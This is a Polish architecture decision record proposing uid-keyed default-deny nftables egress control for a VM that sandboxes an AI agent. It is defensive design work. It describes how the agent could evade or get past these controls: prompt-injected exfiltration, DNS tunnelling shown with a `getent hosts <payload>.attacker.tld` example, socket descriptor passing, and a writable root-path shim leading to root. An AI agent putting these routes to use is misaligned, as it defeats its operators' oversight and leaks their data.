<!--
AI-Provenance:
  model: Claude Opus 5 (1M context)
  harness: Claude Code
-->

# ADR-0024: Kontrola egressu gościa po uid

- Status: Proposed
- Date: 2026-07-29
- Dotyczy: `internal/lima`, `internal/cli`, ruleset nftables gościa
- Powiązane: [ADR-0022](0022-mcp-credential-broker.md) (zostawia wyniesienie
  danych otwarte), [ADR-0023](0023-inference-credential-custody.md) (opiera się
  na tej decyzji i domyka się nią w całości),
  [ADR-0026](0026-egress-destination-allowlist.md) (allowlista celów, wydzielona
  z tej decyzji i wstrzymana), [ADR-0003](0003-lima-trust-boundary.md),
  [ADR-0016](0016-normative-documents-are-corrected-not-archived.md)

## Context

ADR-0022 przeniósł tokeny MCP spod tożsamości agenta, ADR-0023 robi to samo z
credentialem inferencji. Oba zostawiają tę samą dziurę: agent **legalnie**
otrzymuje treść przez dozwolone narzędzia i może ją wysłać dowolnie, bo ma
nieograniczone wyjście na zewnątrz. ADR-0023 jest ponadto niepełny bez tej
decyzji — jego broker słucha na loopback TCP, gdzie tożsamości rozmówcy nie
ustala nikt, a jedyne domknięcie to reguła kluczowana po uid.

### Ta decyzja została zawężona, i to jest jej najważniejszy zapis

Pierwsza wersja obejmowała dwie rzeczy naraz: reguły kluczowane po uid **oraz**
wyliczalną allowlistę celów. To drugie jest sprzeczne z `AGENTS.md` §4, który
wymienia „domenowy network allowlist" wśród rzeczy, których Torio NIE MOŻE
implementować. `AGENTS.md` jest pierwszym źródłem prawdy (§3) i wyprzedza każdy
ADR, a §3 tego pliku każe przy sprzeczności stanąć i zgłosić konflikt, nie
rozstrzygać go po cichu. Poprzednia wersja tego ADR-u odwracała odpowiedni wpis
z `docs/03-architecture.md`, ale §4 nie wspominała w ogóle.

Konflikt został zgłoszony i rozstrzygnięty przez operatora (2026-07-29) przez
**rozdzielenie**, nie przez zmianę §4:

- Ta decyzja zostaje przy części kluczowanej po uid. Allowlista **tożsamości**
  nie jest allowlistą **domen**, więc §4 jej nie dotyczy.
- Allowlista celów przechodzi do [ADR-0026](0026-egress-destination-allowlist.md),
  który pozostaje wstrzymany do czasu decyzji operatora o §4.

Zawężenie ma cenę i należy ją nazwać na wejściu, a nie w przypisie: **`hermes`
zachowuje nieograniczony zbiór celów**. Ta decyzja nie zamyka wyniesienia
danych i nie wolno jej tak opisywać.

### Co zostało zweryfikowane na żywej instancji

**Reguła netfiltera kluczowana po uid jest realną granicą wobec `hermes`.**
`meta skuid` działa na tym kernelu (6.8.0-134, `nf_tables` rezydentny,
`nft --check` przechodzi z rozwiązywaniem nazwy `"hermes"` na uid), a `--check`
jest przejściem do kernela, nie parsowaniem — bez roota kończy się `Operation
not permitted` na netlinku, a odrzucenia po stronie kernela wychodzą z niego
dosłownie. `hermes` nie ma sudo, nie ma żadnej capability, `unshare --net` mu
odmawia, userns jest ograniczony przez AppArmor, i nie posiada żadnego pliku na
uprzywilejowanej ścieżce wykonania. **Nie ma prymitywu, którym mógłby ten
ruleset przeczytać, zmienić ani ominąć.**

**Czym dokładnie jest ten uid, bo od tego zależy, dlaczego granica trzyma.**
`nft_meta_get_eval_skugid()` porównuje `sock->file->f_cred->fsuid` — **fsuid
procesu, który utworzył gniazdo**, nie uid nadawcy pakietu i nie euid.
`f_cred` jest ustawiane raz, w `init_file()` z `current_cred()`, i później nigdy
nie jest przeliczane. Proces może wybrać sobie fsuid przez `setfsuid(2)` przed
`socket(2)`, ale bez `CAP_SETUID` wolno mu wyłącznie własne uid/euid/suid, więc
nieuprzywilejowany `hermes` nie podszyje się pod `torio-mcp`. To ta różnica —
twórca gniazda, nie nadawca — czyni z reguły granicę, i dlatego jest zapisana,
a nie zostawiona jako „czyta uid".

**`meta skuid` nie jest ograniczone do `output`.** Walidacja nie przypina go do
hooka; działa wszędzie, gdzie `skb_to_full_sk()` zwróci fullsock — czyli także
`postrouting`. Wybór hooka jest więc naszą decyzją, nie ograniczeniem
mechanizmu. Dla ruchu wychodzącego z `hermes` obie ścieżki dają ten sam wynik,
ale nie wolno opisywać `output` jako jedynego dostępnego miejsca.

**Po stronie hosta nie ma gdzie tego egzekwować.** Podsieć gościa
`192.168.5.0/24` nie istnieje na żadnym interfejsie macOS; stos TCP/IP gościa
kończy się **wewnątrz procesu `limactl hostagent`**, działającego jako uid
operatora, który potem otwiera zwykłe gniazda na `en0`. Reguła pf `user 501`
objęłaby więc cały własny ruch operatora — przeglądarkę, gita, wszystko. Nic po
stronie hosta nie odróżnia ruchu gościa od ruchu operatora. **Egzekwowanie jest
w gościu albo nigdzie.**

## Decision

**Domyślnie DROP na `output` w gościu, z jawnymi przepustkami kluczowanymi po
uid, we własnej tabeli nftables Torio.**

1. **Default-deny, nie default-accept z regułami drop.** To nie jest kwestia
   stylu, i nie jest już domysłem.

   `nft_meta_get_eval_skugid()` wymaga trzech rzeczy naraz: niezerowego `sk`,
   `sk_fullsock(sk)` oraz `sock && sock->file`. Brak którejkolwiek to `goto err`
   i `NFT_BREAK` — **reguła nie dopasowuje**. Gniazdo osierocone, TIME_WAIT,
   request socket i gniazdo kernelowe nie mają `struct file`, bo `sock_orphan()`
   robi `sk_set_socket(sk, NULL)` i łańcuch do pliku faktycznie się rwie.

   Stąd wniosek, który wcześniej stał na lekturze upstreamu, a teraz stoi na
   kodzie tagu `v6.8` — dokładnie kernela tego gościa: polityka „accept, a
   `hermes` drop" jest omijalna sekwencją połącz-wyślij-zamknij, bo pakiet
   teardownu nie dopasuje **także** reguły `drop`. Przy `policy drop` pakiet
   nieprzypisywalny nie pasuje do niczego i ginie.

   **Fail-closed jest więc własnością kształtu rulesetu, nie mechanizmu.**
   Dodatnia przepustka po uid przy domyślnym DROP zamyka się sama; każda
   konstrukcja odwrotna nie. Zanegowane dopasowanie jest jeszcze gorsze —
   `xt_owner` pokazuje, że przy `! --uid-owner N` gniazdo osierocone **dopasuje**
   regułę, więc reguła „wszystko poza `hermes`" przepuściłaby dokładnie ten ruch,
   który miała złapać.

2. **Własna tabela, nigdy `nft flush ruleset`.** Lima instaluje w gościu własne
   `table ip nat` z hookami `LIMADNS`; globalny flush skasowałby jej DNS.

3. **Rodzina `inet`, albo jawny drop dla v6.** Gość ma dziś tylko adres
   link-local, więc ruleset napisany wyłącznie dla `ip` przepuściłby po cichu
   cały v6 w dniu, w którym Lima albo Mac dostaną uplink v6.

4. **Przepustki są per-uid, wyliczalne i nie zawężają adresata.** `hermes`
   (agent), `torio-mcp` (broker MCP), `torio-infer` (ADR-0023), `_apt`,
   `systemd-resolve`, `systemd-timesync`, timery roota, operator. Operator
   zachowuje normalną sieć — inaczej `git push` z `torio project shell`
   przestaje działać. Żadna z tych przepustek nie mówi, dokąd wolno; to jest
   dokładnie ta część, którą wydziela ADR-0026.

5. **Jeden wyjątek zawęża adresata i nie jest domeną.** Port brokera inferencji
   z ADR-0023 na loopbacku jest osiągalny wyłącznie z uid `hermes`. Adresatem
   jest tu adres loopback ustalony w konfiguracji tego samego gościa, a nie
   nazwa w internecie — §4 mówi o czym innym. To jest zarazem jedyny powód, dla
   którego ADR-0023 może zostać przyjęty bez ADR-0026.

6. **Żaden proces z przepustką nie przekazuje deskryptora gniazda agentowi.**
   To wynika wprost z tego, czym jest dopasowanie: uid jest przypisany do
   **otwartego pliku gniazda**, a nie do procesu, który przez niego pisze.
   `SCM_RIGHTS` przenosi referencję do tej samej open file description
   (`fd_install(new_fd, get_file(f))`), więc gniazdo utworzone przez brokera i
   wręczone agentowi nadal niesie `skuid torio-mcp` — ruch agenta przechodziłby
   przez przepustkę brokera, wyglądając w rulesecie na ruch brokera.

   Jest to jedyna znana droga ominięcia tej reguły z uid agenta i **nie da się
   jej zamknąć w netfilterze**. Zamyka ją wyłącznie projekt brokera: broker nie
   ma powierzchni, która przekazuje fd, i musi tego dowodzić w kodzie, a nie
   dziedziczyć przez to, że nikt takiej powierzchni nie napisał.

7. **Weryfikacja czyta treść rulesetu, nie jego obecność.** Załadowana, ale
   opróżniona tabela przechodzi każdy test pliku i nie egzekwuje niczego — ten
   sam argument, którym ADR-0022 odrzuca obecny-lecz-martwy socket. Kontrola musi
   udowodnić politykę łańcucha i zestaw reguł, oraz że unit jest **enabled i
   active** (`nftables.service` jest dziś `disabled/inactive`).

## Co ta decyzja kupuje, a czego nie

Po zawężeniu lista jest krótka i łatwo ją przecenić, więc stoi tu jawnie.

Kupuje:

- **ADR-0023 przestaje być niepełny.** Loopback TCP nie ustala tożsamości
  rozmówcy; reguła po uid ustala, i to jest jedyne dostępne domknięcie.
- **Każda nowa tożsamość na gościu startuje bez sieci.** Pakiet dokładający
  demona, usługa dołożona przez późniejszą pracę, uid utworzony przez cudzy
  instalator — żadne z nich nie dostaje wyjścia milcząco. Dziś dostaje.
- **Zasięg sieciowy każdej tożsamości staje się wyliczalny**, czytany z
  rulesetu, a nie z tego, co ktoś kiedyś założył.

Nie kupuje **niczego wobec `hermes`**. Agent ma przepustkę bez ograniczenia
celu, więc prowadzony wstrzykniętą instrukcją wyśle dane dokładnie tak samo jak
przed tą decyzją. Zdanie „wyniesienie danych zostaje nierozwiązane" z ADR-0022
pozostaje prawdziwe w całości.

## Precondition, bez którego ta decyzja nic nie znaczy

`/usr/local/bin/hermes` jest **root-owym symlinkiem na plik zapisywalny przez
`hermes`** (`-rwxrwxr-x hermes hermes`), a `/usr/local/bin` jest pierwsze na
`secure_path` sudo, na maszynie, gdzie operator ma sudo bez hasła.

Torio samo nigdy nie uruchamia tego shimu jako root. Ale **jedno `sudo hermes …`
napisane przez operatora wykonuje kod autorstwa agenta jako root** i kasuje
dowolny ruleset jedną komendą.

**Granica egzekwowana przez kernel, którą operator może usunąć jednym poleceniem
po socjotechnice, nie jest granicą.** To musi zostać naprawione przed tą pracą
albo razem z nią: shim powinien być plikiem należącym do roota (kopia albo
wrapper robiący `exec` pod `setpriv --reuid hermes`), a `bootstrap` powinien
dowodzić, że ostateczny cel shimu **nie** jest zapisywalny przez `hermes`. Jest
to dziś jedyna w całym gościu jednokrokowa ścieżka od uid agenta do roota.

## Czego ta decyzja NIE zamyka

**Wyniesienia danych przez agenta.** Patrz wyżej: to jest bezpośredni skutek
zawężenia, nie luka odkryta po fakcie.

**DNS jest kanałem wyniesienia i kluczowanie po uid go nie dotyka.** Każde
zapytanie wychodzi z gościa jako `systemd-resolved`, uid 991 — **nigdy** jako
uid agenta. Przepustka na DNS oddaje więc `hermes` dwukierunkowy kanał: dane w
etykietach zapytania, odpowiedzi w TXT/CNAME, bez żadnego specjalnego narzędzia —
`getent hosts <payload>.attacker.tld` wystarcza. Przypięcie serwera DNS **nie
pomaga**, bo wyciek jest w nazwie, nie w adresacie. Do rozstrzygnięcia osobno:
resolwer odrzucający nazwy spoza allowlisty, statyczny `/etc/hosts`, albo jawne
przyjęcie tego kanału do wiadomości.

**Każdy dopuszczony uid jest confused deputy, a ADR-0022 tworzy jednego
celowo.** Broker MCP musi sięgać do swojego upstreamu, więc cokolwiek agent
przepchnie przez przyznane narzędzie **zapisujące** — komentarz w Jirze, strona
w Confluence — opuszcza pudełko czysto, pod dozwolonym uid, wyglądając na ruch
legalny. Kontrola po uid **przenosi** ten kanał, a nie go zamyka.

## Consequences

- **Inwentarz uid staje się artefaktem, który ktoś utrzymuje.** Ubuntu w tle
  chce wyjścia dla `unattended-upgrades`, `systemd-timesyncd`, `motd-news` i
  `ua-timer`; nowa usługa gościa to nowa przepustka. Cicha odmowa zamieni je w
  powtarzające się błędy w logach, więc komunikat musi mówić wprost, której
  tożsamości brakuje.
- Pakiet instalujący w przyszłości binarkę setuid-root albo z `cap_net_raw`
  wybije dziurę bez ostrzeżenia, bo jej gniazda niosłyby `skuid 0`. `bootstrap`
  powinien dowodzić inwentarza setuid/getcap tak, jak dowodzi trybów plików.
- **Ruch teardownu będzie cicho dropowany, i to jest skutek operacyjny, nie
  luka.** Retransmisje po `close()`, FIN/ACK z TIME_WAIT i część ICMP nie mają
  przypisywalnego uid, więc przy `policy drop` giną. W rulesecie z
  `ct state established,related accept` przed regułami uid większość z nich
  zostaje zaakceptowana wcześniej i nigdy do nich nie dociera — ale ta kolejność
  musi być w rulesecie **świadomie**, a nie wyjść przypadkiem. Ile tego zostaje
  na tym konkretnym gościu, nie było mierzone.
- Sprzężenie z historią obrazu — `vm bootstrap` pobierający `install.sh` i
  wykonujący `apt-get` po zwykłym HTTP — **nie jest już ograniczeniem
  kolejności prac dla tej decyzji**, bo obie operacje biegną pod uid z
  przepustką. Wraca w ADR-0026 i tam jest opisane.

## Rejected

- **Zmiana `AGENTS.md` §4, żeby zmieścić allowlistę celów w tej decyzji.**
  Odrzucone jako sposób odblokowania *tej* decyzji, nie jako sposób w ogóle. §4
  jest pierwszym źródłem prawdy; decyzja, która zaczyna od poluzowania
  ograniczenia, żeby się w nim zmieścić, nie jest ograniczana przez nic.
  Allowlista celów ma własny ADR i własną drogę przez §4.
- **Egzekwowanie po stronie hosta (pf).** Podsieci gościa nie ma na żadnym
  interfejsie macOS, a ruch gościa wychodzi z procesu działającego jako operator —
  reguła `user 501` objęłaby cały jego własny ruch. Do tego dopasowywanie po
  użytkowniku w pf na współczesnym macOS jest niezweryfikowane. Wsparta ścieżka
  Apple'a to filtr Network Extension per-proces, którego w tym repo nie ma.
- **Polityka `accept` z regułami `drop` dla wybranych uid.** Omijalna przez
  gniazda osierocone (patrz Decision 1). Odrzucona na podstawie kodu, nie
  ostrożności.
- **Reguła zanegowana („wszystko poza `hermes`").** Gorsza niż powyższa:
  osierocone gniazdo **dopasuje** zanegowany warunek, więc reguła przepuszcza
  dokładnie ten ruch, dla którego istnieje.
- **Czekanie na `socket uid` / `socket gid` w nftables.** Patchset z 2022-04-20
  ma w patchworku stan `changes-requested` i nigdy nie został scalony; `enum
  nft_socket_keys` w gałęzi master nadal go nie zawiera. Maintainer odrzucił
  kierunek świadomie, argumentując, że lepiej uczynić `meta skuid` użytecznym
  wszędzie niż dodawać nowy selektor. Cztery lata bez ruchu — nie ma na co
  czekać i nie ma lepszej prymitywy w drodze.
- **Globalny `nft flush ruleset` przed instalacją własnych reguł.** Kasuje hooki
  DNS Limy i psuje rozwiązywanie nazw w całym gościu.
- **Zaniechanie, bo po zawężeniu zostało niewiele.** Zostały trzy rzeczy z
  sekcji „co ta decyzja kupuje", a jedna z nich jest warunkiem przyjęcia
  ADR-0023. To wystarcza, pod warunkiem że nigdzie nie zostanie to opisane jako
  kontrola wyniesienia danych.

## Niezweryfikowane

Zapisane, żeby nikt nie wziął ich za ustalone: czy pf jest na tym Macu w ogóle
włączone; czy Lima 2.2.0 wystawia jakikolwiek własny knob na ograniczenie
egressu usernetu; ile ruchu teardownu faktycznie ginie na tym gościu po
wprowadzeniu `policy drop`.

Zachowanie `meta skuid` wobec gniazd osieroconych **przestało tu być** —
mechanizm jest sprawdzony w `net/netfilter/nft_meta.c` na tagu `v6.8`, czyli w
kernelu tego gościa (patrz Decision 1). Odnośnikiem jest
`nft_meta_get_eval_skugid()`, nie `xt_owner` i nie wątek na LKML: semantyka
przenosi się z iptables, ale dowód dla nftables leży w tej jednej funkcji. W
gałęzi master funkcja jest przepisana na RCU, a warunek dopasowania jest
identyczny.
